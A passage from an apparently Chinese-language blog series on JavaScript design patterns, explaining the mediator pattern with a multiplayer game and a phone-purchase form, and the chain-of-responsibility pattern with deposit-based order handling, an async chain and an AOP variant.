玩家死亡的方法要变得稍微复杂一点，我们需要在每个玩家死亡的时候，都遍历其他队友的生存状况，如果队友全部死亡，则这局游戏失败，同时敌人队伍的所有玩家都取得胜利，代码如下：123456789101112131415161718Player.prototype.die = function() &#123; // 玩 家 死 亡 var all_dead = true; this.state = 'dead'; // 设 置 玩 家 状 态 为 死 亡 for (var i = 0, partner; partner = this.partners[i++];) &#123; // 遍 历 队 友 列 表 if (partner.state !== 'dead') &#123; // 如 果 还 有 一 个 队 友 没 有 死 亡， 则 游 戏 还 未 失 败 all_dead = false; break; &#125; &#125; if (all_dead === true) &#123; // 如 果 队 友 全 部 死 亡 this.lose(); // 通 知 自 己 游 戏 失 败 for (var i = 0, partner; partner = this.partners[i++];) &#123; // 通 知 所 有 队 友 玩 家 游 戏 失 败 partner.lose(); &#125; for (var i = 0, enemy; enemy = this.enemies[i++];) &#123; // 通 知 所 有 敌 人 游 戏 胜 利 enemy.win(); &#125; &#125;&#125;; 最后定义一个工厂来创建玩家：1234567891011121314var playerFactory = function(name, teamColor) &#123; var newPlayer = new Player(name, teamColor); // 创 建 新 玩 家 for (var i = 0, player; player = players[i++];) &#123; // 通 知 所 有 的 玩 家， 有 新 角 色 加 入 if (player.teamColor === newPlayer.teamColor) &#123; // 如 果 是 同 一 队 的 玩 家 player.partners.push(newPlayer); // 相 互 添 加 到 队 友 列 表 newPlayer.partners.push(player); &#125; else &#123; player.enemies.push(newPlayer); // 相 互 添 加 到 敌 人 列 表 newPlayer.enemies.push(player); &#125; &#125; players.push(newPlayer); return newPlayer; &#125;; 创建8个玩家，并让红队玩家全部死亡，查看输出结果。123456789101112131415// 红 队： var player1 = playerFactory('皮 蛋', 'red'), player2 = playerFactory('小 乖', 'red'), player3 = playerFactory('宝 宝', 'red'), player4 = playerFactory('小 强', 'red');// 蓝 队：var player5 = playerFactory('黑 妞', 'blue'), player6 = playerFactory('葱 头', 'blue'), player7 = playerFactory('胖 墩', 'blue'), player8 = playerFactory('海 盗', 'blue');player1.die(); player2.die(); player4.die(); player3.die(); 玩家增多带来的困扰现在我们已经可以随意地为游戏增加玩家或者队伍，但问题是，每个玩家和其他玩家都是紧紧耦合在一起的。在此段代码中，每个玩家对象都有两个属性，this.partners和this.enemies，用来保存其他玩家对象的引用。当每个对象的状态发生改变，比如角色移动、吃到道具或者死亡时，都必须要显式地遍历通知其他对象。 在这个例子中只创建了8个玩家，或许还没有对你产生足够多的困扰，而如果在一个大型网络游戏中，画面里有成百上千个玩家，几十支队伍在互相厮杀。如果有一个玩家掉线，必须从所有其他玩家的队友列表和敌人列表中都移除这个玩家。游戏也许还有解除队伍和添加到别的队伍的功能，红色玩家可以突然变成蓝色玩家，这就不再仅仅是循环能够解决的问题了。面对这样的需求，上面的代码可完全没有办法解决。 用中介者模式改造泡泡堂游戏现在我们开始用中介者模式来改造上面的泡泡堂游戏，首先仍然是定义Player构造函数和player对象的原型方法，在player对象的这些原型方法中，不再负责具体的执行逻辑，而是把操作转交给中介者对象，我们把中介者对象命名为playerDirector：123456789101112131415161718192021222324function Player(name, teamColor) &#123; this.name = name; // 角 色 名 字 this.teamColor = teamColor; // 队 伍 颜 色 this.state = 'alive'; // 玩 家 生 存 状 态 &#125;;Player.prototype.win = function() &#123; console.log(this.name + ' won ');&#125;;Player.prototype.lose = function() &#123; console.log(this.name + ' lost');&#125;; /******************* 玩 家 死 亡*****************/Player.prototype.die = function() &#123; this.state = 'dead'; playerDirector.ReceiveMessage('playerDead', this); // 给 中 介 者 发 送 消 息， 玩 家 死 亡 &#125;; /******************* 移 除 玩 家*****************/Player.prototype.remove = function() &#123; playerDirector.ReceiveMessage('removePlayer', this); // 给 中 介 者 发 送 消 息， 移 除 一 个 玩 家 &#125;; /******************* 玩 家 换 队*****************/ Player.prototype.changeTeam = function( color )&#123; playerDirector.ReceiveMessage( 'changeTeam', this, color ); // 给 中 介 者 发 送 消 息， 玩 家 换 队 &#125;; 再继续改写之前创建玩家对象的工厂函数，可以看到，因为工厂函数里不再需要给创建的玩家对象设置队友和敌人，这个工厂函数几乎失去了工厂的意义：12345var playerFactory = function(name, teamColor) &#123; var newPlayer = new Player(name, teamColor); // 创 造 一 个 新 的 玩 家 对 象 playerDirector.ReceiveMessage('addPlayer', newPlayer); // 给 中 介 者 发 送 消 息， 新 增 玩 家 return newPlayer; &#125;; 最后，我们需要实现这个中介者playerDirector对象，一般有以下两种方式。 利用发布—订阅模式。将playerDirector实现为订阅者，各player作为发布者，一旦player的状态发生改变，便推送消息给playerDirector，playerDirector处理消息后将反馈发送给其他player。 在playerDirector中开放一些接收消息的接口，各player可以直接调用该接口来给playerDirector发送消息，player只需传递一个参数给playerDirector，这个参数的目的是使playerDirector可以识别发送者。同样，playerDirector接收到消息之后会将处理结果反馈给其他player。 这两种方式的实现没什么本质上的区别。在这里我们使用第二种方式，playerDirector开放一个对外暴露的接口ReceiveMessage，负责接收player对象发送的消息，而player对象发送消息的时候，总是把自身this作为参数发送给playerDirector，以便playerDirector识别消息来自于哪个玩家对象，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263var playerDirector = (function() &#123; var players = &#123;&#125;, // 保 存 所 有 玩 家 operations = &#123;&#125;; // 中 介 者 可 以 执 行 的 操 作 /**************** 新 增 一 个 玩 家***************************/ operations.addPlayer = function(player) &#123; var teamColor = player.teamColor; // 玩 家 的 队 伍 颜 色 players[teamColor] = players[teamColor] || []; // 如 果 该 颜 色 的 玩 家 还 没 有 成 立 队 伍， 则 新 成 立 一 个 队 伍 players[teamColor].push(player); // 添 加 玩 家 进 队 伍 &#125;; /**************** 移 除 一 个 玩 家***************************/ operations.removePlayer = function(player) &#123; var teamColor = player.teamColor, // 玩 家 的 队 伍 颜 色 teamPlayers = players[teamColor] || []; // 该 队 伍 所 有 成 员 for (var i = teamPlayers.length - 1; i &gt;= 0; i--) &#123; // 遍 历 删 除 if (teamPlayers[i] === player) &#123; teamPlayers.splice(i, 1); &#125; &#125; &#125;; /**************** 玩 家 换 队***************************/ operations.changeTeam = function(player, newTeamColor) &#123; // 玩 家 换 队 operations.removePlayer(player); // 从 原 队 伍 中 删 除 player.teamColor = newTeamColor; // 改 变 队 伍 颜 色 operations.addPlayer(player); // 增 加 到 新 队 伍 中 &#125;; operations.playerDead = function(player) &#123; // 玩 家 死 亡 var teamColor = player.teamColor, teamPlayers = players[teamColor]; // 玩 家 所 在 队 伍 var all_dead = true; for (var i = 0, player; player = teamPlayers[i++];) &#123; if (player.state !== 'dead') &#123; all_dead = false; break; &#125; &#125; if (all_dead === true) &#123; // 全 部 死 亡 for (var i = 0, player; player = teamPlayers[i++];) &#123; player.lose(); // 本 队 所 有 玩 家 lose &#125; for (var color in players) &#123; if (color !== teamColor) &#123; var teamPlayers = players[color]; // 其 他 队 伍 的 玩 家 for (var i = 0, player; player = teamPlayers[i++];) &#123; player.win(); // 其 他 队 伍 所 有 玩 家 win &#125; &#125; &#125; &#125; &#125;; var ReceiveMessage = function() &#123; var message = Array.prototype.shift.call(arguments); // arguments 的 第 一 个 参 数 为 消 息 名 称 operations[message].apply(this, arguments); &#125;; return &#123; ReceiveMessage: ReceiveMessage &#125;&#125;)(); 可以看到，除了中介者本身，没有一个玩家知道其他任何玩家的存在，玩家与玩家之间的耦合关系已经完全解除，某个玩家的任何操作都不需要通知其他玩家，而只需要给中介者发送一个消息，中介者处理完消息之后会把处理结果反馈给其他的玩家对象。我们还可以继续给中介者扩展更多功能，以适应游戏需求的不断变化。 中介者模式的例子——购买商品假设我们正在编写一个手机购买的页面，在购买流程中，可以选择手机的颜色以及输入购买数量，同时页面中有两个展示区域，分别向用户展示刚刚选择好的颜色和数量。还有一个按钮动态显示下一步的操作，我们需要查询该颜色手机对应的库存，如果库存数量少于这次的购买数量，按钮将被禁用并且显示库存不足，反之按钮可以点击并且显示放入购物车。 这个需求是非常容易实现的，假设我们已经提前从后台获取到了所有颜色手机的库存量：1234var goods = &#123; // 手 机 库 存 \"red\": 3, \"blue\": 6&#125;; 那么页面有可能显示为如下几种场景： 选择红色手机，购买4个，库存不足。 选择蓝色手机，购买5个，库存充足，可以加入购物车。 或者是没有输入购买数量的时候，按钮将被禁用并显示相应提示。 我们大概已经能够猜到，接下来将遇到至少5个节点，分别是： 下拉选择框colorSelect 文本输入框numberInput 展示颜色信息colorInfo 展示购买数量信息numberInfo 决定下一步操作的按钮nextBtn 接下来将分别监听colorSelect的onchange事件函数和numberInput的oninput事件函数，然后在这两个事件中作出相应处理。1234567891011121314151617181920212223242526272829303132var colorSelect = document.getElementById('colorSelect'), numberInput = document.getElementById('numberInput'), colorInfo = document.getElementById('colorInfo'), numberInfo = document.getElementById('numberInfo'), nextBtn = document.getElementById('nextBtn');var goods = &#123; // 手 机 库 存 \"red\": 3, \"blue\": 6&#125;;colorSelect.onchange = function() &#123; var color = this.value,// 颜 色 number = numberInput.value, // 数 量 stock = goods[color]; // 该 颜 色 手 机 对 应 的 当 前 库 存 colorInfo.innerHTML = color; if (!color) &#123; nextBtn.disabled = true; nextBtn.innerHTML = '请 选 择 手 机 颜 色'; return; &#125; if (((number - 0) | 0) !== number - 0) &#123; // 用 户 输 入 的 购 买 数 量 是 否 为 正 整 数 nextBtn.disabled = true; nextBtn.innerHTML = '请 输 入 正 确 的 购 买 数 量'; return; &#125; if (number &gt; stock) &#123; // 当 前 选 择 数 量 超 过 库 存 量 nextBtn.disabled = true; nextBtn.innerHTML = '库 存 不 足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放 入 购 物 车';&#125;; 对象之间的联系来考虑一下，当触发了colorSelect的onchange之后，会发生什么事情。 首先我们要让colorInfo中显示当前选中的颜色，然后获取用户当前输入的购买数量，对用户的输入值进行一些合法性判断。再根据库存数量来判断nextBtn的显示状态。numberInput的事件相关代码：12345678910111213141516171819202122232425numberInput.oninput = function() &#123; var color = colorSelect.value, // 颜 色 number = this.value, // 数 量 stock = goods[color]; // 该 颜 色 手 机 对 应 的 当 前 库 存 numberInfo.innerHTML = number; if (!color) &#123; nextBtn.disabled = true; nextBtn.innerHTML = '请 选 择 手 机 颜 色'; return; &#125; if (((number - 0) | 0) !== number - 0) &#123; // 输 入 购 买 数 量 是 否 为 正 整 数 nextBtn.disabled = true; nextBtn.innerHTML = '请 输 入 正 确 的 购 买 数 量'; return; &#125; if (number &gt; stock) &#123; // 当 前 选 择 数 量 没 有 超 过 库 存 量 nextBtn.disabled = true; nextBtn.innerHTML = '库 存 不 足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放 入 购 物 车';&#125;; 虽然目前顺利完成了代码编写，但随之而来的需求改变有可能给我们带来麻烦。假设现在要求去掉colorInfo和numberInfo这两个展示区域，我们就要分别改动colorSelect.onchange和numberInput.oninput里面的代码，因为在先前的代码中，这些对象确实是耦合在一起的。 目前我们面临的对象还不算太多，当这个页面里的节点激增到10个或者15个时，它们之间的联系可能变得更加错综复杂，任何一次改动都将变得很棘手。 假设页面中将新增另外一个下拉选择框，代表选择手机内存。现在我们需要计算颜色、内存和购买数量，来判断nextBtn是显示库存不足还是放入购物车。 而具体实现则需要先修改表示存库的JSON对象以及修改colorSelect的onchange事件函数，同样要改写numberInput的事件相关代码，具体代码的改变跟colorSelect大同小异，最后还要新增memorySelect的onchange事件函数。 仅仅是增加一个内存的选择条件，就要改变如此多的代码，这是因为在目前的实现中，每个节点对象都是耦合在一起的，改变或者增加任何一个节点对象，都要通知到与其相关的对象。 引入中介者现在我们来引入中介者对象，所有的节点对象只跟中介者通信。当下拉选择框colorSelect、memorySelect和文本输入框numberInput发生了事件行为时，它们仅仅通知中介者它们被改变了，同时把自身当作参数传入中介者，以便中介者辨别是谁发生了改变。剩下的所有事情都交给中介者对象来完成，这样一来，无论是修改还是新增节点，都只需要改动中介者对象里的代码。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859var goods = &#123; // 手 机 库 存 \"red | 32G\": 3, \"red | 16G\": 0, \"blue | 32G\": 1, \"blue | 16G\": 6&#125;;var mediator = (function() &#123; var colorSelect = document.getElementById('colorSelect'), memorySelect = document.getElementById('memorySelect'), numberInput = document.getElementById('numberInput'), colorInfo = document.getElementById('colorInfo'), memoryInfo = document.getElementById('memoryInfo'), numberInfo = document.getElementById('numberInfo'), nextBtn = document.getElementById('nextBtn'); return &#123; changed: function(obj) &#123; var color = colorSelect.value, // 颜 色 memory = memorySelect.value, // 内 存 number = numberInput.value, // 数 量 stock = goods[color + '|' + memory]; // 颜 色 和 内 存 对 应 的 手 机 库 存 数 量 if (obj === colorSelect) &#123; // 如 果 改 变 的 是 选 择 颜 色 下 拉 框 colorInfo.innerHTML = color; &#125; else if (obj === memorySelect) &#123; memoryInfo.innerHTML = memory; &#125; else if (obj === numberInput) &#123; numberInfo.innerHTML = number; &#125; if (!color) &#123; nextBtn.disabled = true; nextBtn.innerHTML = '请 选 择 手 机 颜 色'; return; &#125; if (!memory) &#123; nextBtn.disabled = true; nextBtn.innerHTML = '请 选 择 内 存 大 小'; return; &#125; if (((number - 0) | 0) !== number - 0) &#123; // 输 入 购 买 数 量 是 否 为 正 整 数 nextBtn.disabled = true; nextBtn.innerHTML = '请 输 入 正 确 的 购 买 数 量'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放 入 购 物 车'; &#125; &#125;&#125;)(); // 事 件 函 数： colorSelect.onchange = function() &#123; mediator.changed(this);&#125;;memorySelect.onchange = function() &#123; mediator.changed(this);&#125;;numberInput.oninput = function() &#123; mediator.changed(this);&#125;; 可以想象，某天我们又要新增一些跟需求相关的节点，比如CPU型号，那我们只需要稍稍改动mediator对象即可：1234567891011121314151617181920212223var goods = &#123; // 手 机 库 存 \"red | 32G | 800\": 3, // 颜 色 red， 内 存 32G， cpu800， 对 应 库 存 数 量 为 3 \"red | 16G | 801\": 0, \"blue | 32G | 800\": 1, \"blue | 16G | 801\": 6&#125;;var mediator = (function() &#123; // 略 var cpuSelect = document.getElementById('cpuSelect'); return &#123; change: function(obj) &#123; // 略 var cpu = cpuSelect.value, stock = goods[color + '|' + memory + '|' + cpu]; if (obj === cpuSelect) &#123; cpuInfo.innerHTML = cpu; &#125; // 略 &#125; &#125;&#125;)(); 小结中介者模式是迎合迪米特法则的一种实现。迪米特法则也叫最少知识原则，是指一个对象应该尽可能少地了解另外的对象（类似不和陌生人说话）。如果对象之间的耦合性太高，一个对象发生改变之后，难免会影响到其他的对象，跟“城门失火，殃及池鱼”的道理是一样的。而在中介者模式里，对象之间几乎不知道彼此的存在，它们只能通过中介者对象来互相影响对方。 因此，中介者模式使各个对象之间得以解耦，以中介者和对象之间的一对多关系取代了对象之间的网状多对多关系。各个对象只需关注自身功能的实现，对象之间的交互关系交给了中介者对象来实现和维护。 不过，中介者模式也存在一些缺点。其中，最大的缺点是系统中会新增一个中介者对象，因为对象之间交互的复杂性，转移成了中介者对象的复杂性，使得中介者对象经常是巨大的。中介者对象自身往往就是一个难以维护的对象。 我们都知道，毒贩子虽然使吸毒者和制毒者之间的耦合度降低，但毒贩子也要抽走一部分利润。同样，在程序中，中介者对象要占去一部分内存。而且毒贩本身还要防止被警察抓住，因为它了解整个犯罪链条中的所有关系，这表明中介者对象自身往往是一个难以维护的对象。 中介者模式可以非常方便地对模块或者对象进行解耦，但对象之间并非一定需要解耦。在实际项目中，模块或对象之间有一些依赖关系是很正常的。毕竟我们写程序是为了快速完成项目交付生产，而不是堆砌模式和过度设计。关键就在于如何去衡量对象之间的耦合程度。一般来说，如果对象之间的复杂耦合确实导致调用和维护出现了困难，而且这些耦合度随项目的变化呈指数增长曲线，那我们就可以考虑用中介者模式来重构代码。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-12-职责链模式","slug":"js-pattern12","date":"2017-11-28T07:58:27.000Z","updated":"2017-12-06T14:50:09.305Z","comments":true,"path":"2017/11/28/js-pattern12/","link":"","permalink":"https://github.com/xmoyKING/2017/11/28/js-pattern12/","excerpt":"","text":"职责链模式的定义是：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。 职责链模式的名字非常形象，一系列可能会处理请求的对象被连接成一条链，请求在这些对象之间依次传递，直到遇到一个可以处理它的对象，我们把这些对象称为链中的节点。 现实中的职责链模式职责链模式的例子在现实中并不难找到，以下就是两个常见的跟职责链模式有关的场景。 如果早高峰能顺利挤上公交车的话，那么估计这一天都会过得很开心。因为公交车上人实在太多了，经常上车后却找不到售票员在哪，所以只好把两块钱硬币往前面递。除非你运气够好，站在你前面的第一个人就是售票员，否则，你的硬币通常要在N个人手上传递，才能最终到达售票员的手里。 中学时代的期末考试，如果你平时不太老实，考试时就会被安排在第一个位置。遇到不会答的题目，就把题目编号写在小纸条上往后传递，坐在后面的同学如果也不会答，他就会把这张小纸条继续递给他后面的人。 从这两个例子中，我们很容易找到职责链模式的最大优点：请求发送者只需要知道链中的第一个节点，从而弱化了发送者和一组接收者之间的强联系。如果不使用职责链模式，那么在公交车上，我就得先搞清楚谁是售票员，才能把硬币递给他。同样，在期末考试中，也许我就要先了解同学中有哪些可以解答这道题。 实际开发中的职责链模式假设我们负责一个售卖手机的电商网站，经过分别交纳500元定金和200元定金的两轮预定后（订单已在此时生成），现在已经到了正式购买的阶段。 公司针对支付过定金的用户有一定的优惠政策。在正式购买后，已经支付过500元定金的用户会收到100元的商城优惠券，200元定金的用户可以收到50元的优惠券，而之前没有支付定金的用户只能进入普通购买模式，也就是没有优惠券，且在库存有限的情况下不一定保证能买到。 我们的订单页面是PHP吐出的模板，在页面加载之初，PHP会传递给页面几个字段。 -orderType：表示订单类型（定金用户或者普通购买用户），code的值为1的时候是500元定金用户，为2的时候是200元定金用户，为3的时候是普通购买用户。-pay：表示用户是否已经支付定金，值为true或者false，虽然用户已经下过500元定金的订单，但如果他一直没有支付定金，现在只能降级进入普通购买模式。-stock：表示当前用于普通购买的手机库存数量，已经支付过500元或者200元定金的用户不受此限制。 下面我们把这个流程写成代码：123456789101112131415161718192021222324252627282930var order = function(orderType, pay, stock) &#123; if (orderType === 1) &#123; // 500 元 定 金 购 买 模 式 if (pay === true) &#123; // 已 支 付 定 金 console.log('500 元 定 金 预 购, 得 到 100 优 惠 券'); &#125; else &#123; // 未 支 付 定 金， 降 级 到 普 通 购 买 模 式 if (stock &gt; 0) &#123; // 用 于 普 通 购 买 的 手 机 还 有 库 存 console.log('普 通 购 买, 无 优 惠 券'); &#125; else &#123; console.log('手 机 库 存 不 足'); &#125; &#125; &#125; else if (orderType === 2) &#123; // 200 元 定 金 购 买 模 式 if (pay === true) &#123; console.log('200 元 定 金 预 购, 得 到 50 优 惠 券'); &#125; else &#123; if (stock &gt; 0) &#123; console.log('普 通 购 买, 无 优 惠 券'); &#125; else &#123; console.log('手 机 库 存 不 足'); &#125; &#125; &#125; else if (orderType === 3) &#123; if (stock &gt; 0) &#123; console.log('普 通 购 买, 无 优 惠 券'); &#125; else &#123; console.log('手 机 库 存 不 足'); &#125; &#125;&#125;;order(1,true,500);//输出：500元定金预购,得到100优惠券 虽然我们得到了意料中的运行结果，但这远远算不上一段值得夸奖的代码。order函数不仅巨大到难以阅读，而且需要经常进行修改。虽然目前项目能正常运行，但接下来的维护工作无疑是个梦魇。恐怕只有最“新手”的程序员才会写出这样的代码。 用职责链模式重构代码现在我们采用职责链模式重构这段代码，先把500元订单、200元订单以及普通购买分成3个函数。 接下来把orderType、pay、stock这3个字段当作参数传递给500元订单函数，如果该函数不符合处理条件，则把这个请求传递给后面的200元订单函数，如果200元订单函数依然不能处理该请求，则继续传递请求给普通购买函数，代码如下：123456789101112131415161718192021222324252627282930//500元订单var order500 = function(orderType, pay, stock) &#123; if (orderType === 1 &amp;&amp; pay === true) &#123; console.log('500 元 定 金 预 购, 得 到 100 优 惠 券'); &#125; else &#123; order200(orderType, pay, stock); // 将 请 求 传 递 给 200 元 订 单 &#125; &#125;;// 200 元 订 单 var order200 = function(orderType, pay, stock) &#123; if (orderType === 2 &amp;&amp; pay === true) &#123; console.log('200 元 定 金 预 购, 得 到 50 优 惠 券'); &#125; else &#123; orderNormal(orderType, pay, stock); // 将 请 求 传 递 给 普 通 订 单 &#125; &#125;;// 普 通 购 买 订 单 var orderNormal = function(orderType, pay, stock) &#123; if (stock &gt; 0) &#123; console.log('普 通 购 买, 无 优 惠 券'); &#125; else &#123; console.log('手 机 库 存 不 足'); &#125; &#125;;// 测 试 结 果： order500(1, true, 500); // 输 出： 500 元 定 金 预 购, 得 到 100 优 惠 券 order500(1, false, 500); // 输 出： 普 通 购 买, 无 优 惠 券 order500(2, true, 500); // 输 出： 200 元 定 金 预 购, 得 到 50 优 惠 券 order500(3, false, 500); // 输 出： 普 通 购 买, 无 优 惠 券 order500(3, false, 0); // 输 出： 手 机 库 存 不 足 可以看到，执行结果和前面那个巨大的order函数完全一样，但是代码的结构已经清晰了很多，我们把一个大函数拆分了3个小函数，去掉了许多嵌套的条件分支语句。 目前已经有了不小的进步，但我们不会满足于此，虽然已经把大函数拆分成了互不影响的3个小函数，但可以看到，请求在链条传递中的顺序非常僵硬，传递请求的代码被耦合在了业务函数之中：12345678//500元订单var order500 = function(orderType, pay, stock) &#123; if (orderType === 1 &amp;&amp; pay === true) &#123; console.log('500 元 定 金 预 购, 得 到 100 优 惠 券'); &#125; else &#123; order200(orderType, pay, stock); // order200 和 order500 耦 合 在 一 起 &#125; &#125;; 这依然是违反开放-封闭原则的，如果有天我们要增加300元预订或者去掉200元预订，意味着就必须改动这些业务函数内部。就像一根环环相扣打了死结的链条，如果要增加、拆除或者移动一个节点，就必须得先砸烂这根链条。 灵活可拆分的职责链节点采用一种更灵活的方式，来改进上面的职责链模式，目标是让链中的各个节点可以灵活拆分和重组。 首先需要改写一下分别表示3种购买模式的节点函数，我们约定，如果某个节点不能处理请求，则返回一个特定的字符串’nextSuccessor’来表示该请求需要继续往后面传递：123456789101112131415161718192021var order500 = function(orderType, pay, stock) &#123; if (orderType === 1 &amp;&amp; pay === true) &#123; console.log('500 元 定 金 预 购， 得 到 100 优 惠 券'); &#125; else &#123; return 'nextSuccessor'; // 我 不 知 道 下 一 个 节 点 是 谁， 反 正 把 请 求 往 后 面 传 递 &#125; &#125;;var order200 = function(orderType, pay, stock) &#123; if (orderType === 2 &amp;&amp; pay === true) &#123; console.log('200 元 定 金 预 购， 得 到 50 优 惠 券'); &#125; else &#123; return 'nextSuccessor'; &#125; &#125;;var orderNormal = function(orderType, pay, stock) &#123; if (stock &gt; 0) &#123; console.log('普 通 购 买， 无 优 惠 券'); &#125; else &#123; console.log('手 机 库 存 不 足'); &#125; &#125;; 接下来需要把函数包装进职责链节点，我们定义一个构造函数Chain，在new Chain的时候传递的参数即为需要被包装的函数，同时它还拥有一个实例属性this.successor，表示在链中的下一个节点。此外Chain的prototype中还有两个函数，它们的作用如下所示：12345678910111213141516// Chain.prototype.setNextSuccessor 指 定 在 链 中 的 下 一 个 节 点 // Chain.prototype.passRequest 传 递 请 求 给 某 个 节 点 var Chain = function(fn) &#123; this.fn = fn; this.successor = null; &#125;;Chain.prototype.setNextSuccessor = function(successor) &#123; return this.successor = successor;&#125;;Chain.prototype.passRequest = function() &#123; var ret = this.fn.apply(this, arguments); if (ret === 'nextSuccessor') &#123; return this.successor &amp;&amp; this.successor.passRequest.apply(this.successor, arguments); &#125; return ret;&#125;; 现在我们把3个订单函数分别包装成职责链的节点：123var chainOrder500 = new Chain( order500 ); var chainOrder200 = new Chain( order200 ); var chainOrderNormal = new Chain( orderNormal ); 然后指定节点在职责链中的顺序：12chainOrder500.setNextSuccessor( chainOrder200 ); chainOrder200.setNextSuccessor( chainOrderNormal ); 最后把请求传递给第一个节点：1234chainOrder500.passRequest( 1, true, 500 ); // 输 出： 500 元 定 金 预 购， 得 到 100 优 惠 券 chainOrder500.passRequest( 2, true, 500 ); // 输 出： 200 元 定 金 预 购， 得 到 50 优 惠 券 chainOrder500.passRequest( 3, true, 500 ); // 输 出： 普 通 购 买， 无 优 惠 券 chainOrder500.passRequest( 1, false, 0 ); // 输 出： 手 机 通过改进，我们可以自由灵活地增加、移除和修改链中的节点顺序，假如某天网站运营人员又想出了支持300元定金购买，那我们就在该链中增加一个节点即可：123456var order300 = function()&#123; // 具 体 实 现 略 &#125;; chainOrder300 = new Chain( order300 ); chainOrder500.setNextSuccessor( chainOrder300); chainOrder300.setNextSuccessor( chainOrder200); 对于程序员来说，我们总是喜欢去改动那些相对容易改动的地方，就像改动框架的配置文件远比改动框架的源代码简单得多。在这里完全不用理会原来的订单函数代码，我们要做的只是增加一个节点，然后重新设置链中相关节点的顺序。 异步的职责链在上面的职责链模式中，我们让每个节点函数同步返回一个特定的值”nextSuccessor”，来表示是否把请求传递给下一个节点。而在现实开发中，我们经常会遇到一些异步的问题，比如我们要在节点函数中发起一个ajax异步请求，异步请求返回的结果才能决定是否继续在职责链中passRequest。 这时候让节点函数同步返回”nextSuccessor”已经没有意义了，所以要给Chain类再增加一个原型方法Chain.prototype.next，表示手动传递请求给职责链中的下一个节点：123Chain.prototype.next = function()&#123; return this.successor &amp;&amp; this.successor.passRequest.apply( this.successor, arguments ); &#125;; 来看一个异步职责链的例子：12345678910111213141516var fn1 = new Chain(function() &#123; console.log(1); return 'nextSuccessor';&#125;);var fn2 = new Chain(function() &#123; console.log(2); var self = this; setTimeout(function() &#123; self.next(); &#125;, 1000);&#125;);var fn3 = new Chain(function() &#123; console.log(3);&#125;);fn1.setNextSuccessor(fn2).setNextSuccessor(fn3);fn1.passRequest(); 现在我们得到了一个特殊的链条，请求在链中的节点里传递，但节点有权利决定什么时候把请求交给下一个节点。可以想象，异步的职责链加上命令模式（把ajax请求封装成命令对象），我们可以很方便地创建一个异步ajax队列库。 职责链模式的优缺点前面已经说过，职责链模式的最大优点就是解耦了请求发送者和N个接收者之间的复杂关系，由于不知道链中的哪个节点可以处理你发出的请求，所以你只需把请求传递给第一个节点即可. 在手机商城的例子中，本来我们要被迫维护一个充斥着条件分支语句的巨大的函数，在例子里的购买过程中只打印了一条log语句。其实在现实开发中，这里要做更多事情，比如根据订单种类弹出不同的浮层提示、渲染不同的UI节点、组合不同的参数发送给不同的cgi等。用了职责链模式之后，每种订单都有各自的处理函数而互不影响。 其次，使用了职责链模式之后，链中的节点对象可以灵活地拆分重组。增加或者删除一个节点，或者改变节点在链中的位置都是轻而易举的事情。这一点我们也已经看到，在上面的例子中，增加一种订单完全不需要改动其他订单函数中的代码。 职责链模式还有一个优点，那就是可以手动指定起始节点，请求并不是非得从链中的第一个节点开始传递。比如在公交车的例子中，如果我明确在我前面的第一个人不是售票员，那我当然可以越过他把公交卡递给他前面的人，这样可以减少请求在链中的传递次数，更快地找到合适的请求接受者。这在普通的条件分支语句下是做不到的，我们没有办法让请求越过某一个if判断。 拿代码来证明这一点，假设某一天网站中支付过定金的订单已经全部结束购买流程，我们在接下来的时间里只需要处理普通购买订单，所以我们可以直接把请求交给普通购买订单节点：1orderNormal.passRequest( 1, false, 500 ); // 普 通 购 买, 无 优 惠 券 如果运用得当，职责链模式可以很好地帮助我们组织代码，但这种模式也并非没有弊端，首先我们不能保证某个请求一定会被链中的节点处理。比如在期末考试的例子中，小纸条上的题目也许没有任何一个同学知道如何解答，此时的请求就得不到答复，而是径直从链尾离开，或者抛出一个错误异常。在这种情况下，我们可以在链尾增加一个保底的接受者节点来处理这种即将离开链尾的请求。 另外，职责链模式使得程序中多了一些节点对象，可能在某一次的请求传递过程中，大部分节点并没有起到实质性的作用，它们的作用仅仅是让请求传递下去，从性能方面考虑，我们要避免过长的职责链带来的性能损耗。 用AOP实现职责链在之前的职责链实现中，我们利用了一个Chain类来把普通函数包装成职责链的节点。其实利用JavaScript的函数式特性，有一种更加方便的方法来创建职责链。 改写Function.prototype.after函数，使得第一个函数返回’nextSuccessor’时，将请求继续传递给下一个函数，无论是返回字符串’nextSuccessor’或者false都只是一个约定，当然在这里我们也可以让函数返回false表示传递请求，选择’nextSuccessor’字符串是因为它看起来更能表达我们的目的，代码如下：1234567891011121314Function.prototype.after = function(fn) &#123; var self = this; return function() &#123; var ret = self.apply(this, arguments); if (ret === 'nextSuccessor') &#123; return fn.apply(this, arguments); &#125; return ret; &#125;&#125;;var order = order500yuan.after(order200yuan).after(orderNormal);order(1, true, 500); // 输 出： 500 元 定 金 预 购， 得 到 100 优 惠 券 order(2, true, 500); // 输 出： 200 元 定 金 预 购， 得 到 50 优 惠 券 order(1, false, 500); // 输 出： 普 通 购 买， 无 优 惠 券 用AOP来实现职责链既简单又巧妙，但这种把函数叠在一起的方式，同时也叠加了函数的作用域，如果链条太长的话，也会对性能有较大的影响。 用职责链模式获取文件上传对象前面有一个用迭代器获取文件上传对象的例子：当时我们创建了一个迭代器来迭代获取合适的文件上传对象，其实用职责链模式可以更简单，我们完全不用创建这个多余的迭代器，完整代码如下：12345678910111213141516171819var getActiveUploadObj = function() &#123; try &#123; return new ActiveXObject(\"TXFTNActiveX.FTNUpload\"); // IE 上 传 控 件 &#125; catch (e) &#123; return 'nextSuccessor'; &#125; &#125;;var getFlashUploadObj = function() &#123; if (supportFlash()) &#123; var str = '&lt;object type=\"application/x-shockwave-flash\" &gt; &lt;/object &gt;'; return $(str).appendTo($(' body')); &#125; return 'nextSuccessor'; &#125;;var getFormUpladObj = function() &#123; return $('&lt;form&gt;&lt;input name=\"file\" 